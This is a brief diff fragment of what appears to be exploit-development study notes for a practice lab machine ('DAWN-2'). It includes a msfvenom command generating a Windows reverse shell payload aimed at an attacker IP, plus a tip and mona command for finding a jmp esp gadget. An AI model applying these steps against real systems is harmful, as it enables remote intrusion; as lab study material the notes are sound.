@@ -186,3 +186,6 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread 
 
 ```
 
+DAWN-2 in proving ground
+If jmp esp is not present look for push esp followed by ret
+!mona jmp -r esp
